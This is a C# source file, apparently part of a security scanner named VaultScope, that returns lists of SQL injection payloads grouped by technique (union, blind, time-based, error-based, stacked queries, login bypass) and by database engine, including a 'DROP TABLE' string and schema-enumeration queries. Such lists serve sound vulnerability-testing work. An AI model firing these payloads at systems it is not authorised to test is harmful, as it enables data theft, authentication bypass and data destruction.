namespace VaultScope.Security.Payloads;

public static class SqlInjectionPayloads
{
    public static List<string> GetPayloads()
    {
        return new List<string>
        {
            // Basic SQL injection
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR '1'='1' --",
            "\" OR \"1\"=\"1\" --",
            "' OR '1'='1' #",
            "\" OR \"1\"=\"1\" #",
            "' OR '1'='1'/*",
            "\" OR \"1\"=\"1\"/*",
            
            // Union-based injection
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL--",
            
            // Boolean-based blind injection
            "' AND '1'='1",
            "' AND '1'='2",
            "' AND 1=1--",
            "' AND 1=2--",
            
            // Time-based blind injection
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR SLEEP(5)--",
            "' OR pg_sleep(5)--",
            "'; SELECT SLEEP(5)--",
            
            // Error-based injection
            "' AND 1=CONVERT(int, 'test')--",
            "' AND 1=CAST('test' AS INTEGER)--",
            "' AND extractvalue(1,concat(0x7e,database()))--",
            
            // Stacked queries
            "; SELECT * FROM users--",
            "; DROP TABLE test--",
            "; INSERT INTO logs VALUES('test')--",
            
            // Common bypass techniques
            "' OR 1=1--",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "') OR ('1'='1'--",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or 1=1#",
            "' or 1=1--",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--"
        };
    }
    
    public static List<string> GetAdvancedPayloads()
    {
        return new List<string>
        {
            // Advanced union-based
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT column_name FROM information_schema.columns--",
            "' UNION SELECT schema_name FROM information_schema.schemata--",
            
            // Advanced blind injection
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "' AND (SELECT LENGTH(database()))>5--",
            "' AND (SELECT ASCII(SUBSTRING(database(),1,1)))>95--",
            
            // Second-order injection
            "admin'||'",
            "admin' + '",
            "admin' || '1'='1",
            
            // XML-based injection
            "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
            "' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--",
            
            // JSON-based injection
            "'}/**/OR/**/1=1--",
            "\"}' OR 1=1--",
            "']};SELECT SLEEP(5)--"
        };
    }
    
    public static Dictionary<string, List<string>> GetDatabaseSpecificPayloads()
    {
        return new Dictionary<string, List<string>>
        {
            ["MySQL"] = new List<string>
            {
                "' AND SLEEP(5)--",
                "' UNION SELECT @@version--",
                "' AND extractvalue(1,concat(0x7e,user()))--"
            },
            ["PostgreSQL"] = new List<string>
            {
                "' AND pg_sleep(5)--",
                "' UNION SELECT version()--",
                "' AND 1=cast((SELECT version()) as int)--"
            },
            ["MSSQL"] = new List<string>
            {
                "'; WAITFOR DELAY '00:00:05'--",
                "' UNION SELECT @@version--",
                "' AND 1=CONVERT(int,@@version)--"
            },
            ["Oracle"] = new List<string>
            {
                "' AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)>0--",
                "' UNION SELECT banner FROM v$version--",
                "' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--"
            }
        };
    }
}